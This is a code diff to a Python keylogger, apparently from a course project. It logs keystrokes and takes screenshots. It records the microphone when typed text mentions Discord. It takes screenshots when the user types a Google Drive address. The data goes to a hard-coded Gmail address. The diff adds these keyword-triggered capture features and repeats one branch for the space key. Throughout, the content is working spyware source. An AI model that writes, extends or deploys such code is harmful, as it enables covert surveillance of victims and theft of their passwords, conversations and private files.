@@ -10,7 +10,6 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from pynput import keyboard
 from pynput.keyboard import Key, Listener
-import logging
 from PIL import ImageGrab
 from datetime import datetime
 
@@ -22,11 +21,10 @@ import sounddevice as sd
 from requests import get
 import os
 import zipfile
+import time
 
 session_folder = str(datetime.now().strftime("%Y-%m-%d %H.%M.%S"))
 os.mkdir(session_folder)
-logging.basicConfig(filename=os.path.join(session_folder, "log_results.txt"), level=logging.DEBUG, format='%(message)s', filemode='w')
-logging.getLogger("urllib3").setLevel(logging.WARNING)
 
 sender_email = "tnm031keylogger@gmail.com"
 receiver_email = "tnm031keylogger@gmail.com"
@@ -110,15 +108,12 @@ computer_information()
 
 def microphone():
     fs = 44100
-    seconds = 5
+    seconds = 10
 
     recording = sd.rec(int(seconds * fs), samplerate=fs, channels=1) # Test if channels=1 works on windows, else 2
     sd.wait()
 
     write(os.path.join(session_folder, "audio.wav"), fs, recording)
-
-
-microphone()
 
 
 def on_release(key):
@@ -127,25 +122,37 @@ def on_release(key):
         return False
 
 
-# TODO: Fix special keys
 def on_press(key):
     global keys
 
-    k = str(key).replace("'", "")
-
-    # TODO: Fix functionality for when to take the screenshot
-    # TODO: Fix when to start recording audio with microphone()
     if key == keyboard.Key.esc:
         screenshot(str(datetime.now().strftime("%Y-%m-%d %H.%M.%S")) + '.png')
 
     elif key == keyboard.Key.space:
         keys.append(" ")
 
+    elif key == keyboard.Key.space:
+        keys.append(" ")
+
     elif key == keyboard.Key.enter:
+        keys.append("\n")
         s = "".join(keys)
-        logging.info(s)
+        if s.find("drive.google.com") != -1:
+            time.sleep(2)
+            screenshot("Google-drive-" + str(datetime.now().strftime("%Y-%m-%d %H.%M.%S")) + '.png')
+            time.sleep(2)
+            screenshot("Google-drive-" + str(datetime.now().strftime("%Y-%m-%d %H.%M.%S")) + '.png')
+
+        # "disc" is usually used when the conversation should go to discord
+        if s.find("disc") != -1:
+            time.sleep(5)
+            microphone()
+
+        with open(os.path.join(session_folder, "log_results.txt"), "a") as f:
+            f.write(s)
         keys = []
     else:
+        k = str(key).replace("'", "")
         keys.append(k)
 
 
